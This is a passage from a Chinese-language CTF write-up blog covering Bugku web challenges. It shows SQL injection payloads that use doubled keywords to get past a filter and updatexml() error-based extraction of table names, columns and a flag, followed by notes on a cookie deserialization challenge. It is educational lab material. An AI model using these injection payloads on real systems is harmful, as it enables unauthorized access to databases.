class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; ununionion seselectlect 1, group_concat(address) from flag1--+</span><br></pre></td></tr></table></figure>\n\n<p>得到下一关地址。</p>\n<p>这里利用 <strong>updatexml()</strong> 函数报错注入</p>\n<p>基础知识：<a href=\"https://blog.csdn.net/zpy1998zpy/article/details/80631036\" target=\"_blank\">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>\n<p>总之是以<code>～</code>开头的内容不是 xml 格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。</p>\n<p>payload:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查数据表</span><br><span class=\"line\">http:&#x2F;&#x2F;120.24.86.145:9004&#x2F;Once_More.php?id&#x3D;1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#39;~&#39;),3) %23</span><br><span class=\"line\"># 查字段</span><br><span class=\"line\">?id&#x3D;1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag2&#39;),&#39;~&#39;),3) %23  </span><br><span class=\"line\"># 查数据</span><br><span class=\"line\">?id&#x3D;1&#39; and updatexml(1,concat(&#39;~&#39;,(select flag2 from flag2),&#39;~&#39;),3) %23</span><br></pre></td></tr></table></figure>\n\n<p>这里<code>%23</code>就是<code>#</code>，但是直接输#，url没能成功转成%23我不知道为什么，写成和第一关一样的<code>--+</code>也是可以的，同时第一关的<code>--+</code>写成<code>%23</code>也可以。updatexml的第一个参数1和第三个参数3都是<code>anything</code>，随便输。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Q：SQL 的注释不是 “--” 吗，为什么还要补上一个 “+” 呢？</span><br><span class=\"line\"></span><br><span class=\"line\">A：SQL 注释是 -- 加个空格，在 url 里面空格会被忽略掉，而 + 在 url 里面等于空格，--+ 和 --a 或 --b 都是为了使空格生效</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Q:为什么第一关的id赋值-1</span><br><span class=\"line\"></span><br><span class=\"line\">A:只要不是 1，2，3，4，5 其中一个就行,为了把前面查询的数据置空 &lt;——（我没看懂啥意思）</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"flagphpbugku\">flag.php(bugku)<a href=\"#flagphpbugku\" title=\"flag.php(bugku)\"></a></h4><p>网址链接：<a href=\"http://123.206.87.240:8002/flagphp/\" target=\"_blank\">http://123.206.87.240:8002/flagphp/</a></p>\n<p>点击 login是没反应的。题目提示是hint，将 hint 赋值为 1，然后就出来源代码了……</p>\n<p>源代码的意思是cookie赋值<code>ISecer</code>，要让cookie的反序列化是KEY，但是这时候KEY还没有被赋值。</p>\n<p><strong>序列化和反序列化：</strong></p>\n<p>Java 序列化就是指把 Java 对象转换为字节序列的过程</p>\n<p>Java 反序列化就是指把字节序列恢复为 Java 对象的过程。</p>\n<p>更多知识：<a href=\"https://www.jianshu.com/p/98b15a0e6806\" target=\"_blank\">https://www.jianshu.com/p/98b15a0e6806</a></p>\n","prev":{"title":"csp刷题笔记（第1-2题）","link":"2020/02/10/csp刷题笔记（第1-2题）"},"next":{"title":"ctf-web-WriteUp-Asuri-bugku","link":"2020/02/10/ctf-web-WriteUp-Asuri-bugku"},"plink":"https://yuyuoo.github.io/2020/02/10/ctf-web-WriteUp-2-Asuri-Bugku/","copyright":{"license":"Attribution-NonCommercial-NoDerivatives 4.0 International","published":"February 10, 2020","updated":"May 29, 2020","author":"YuYuoo"}}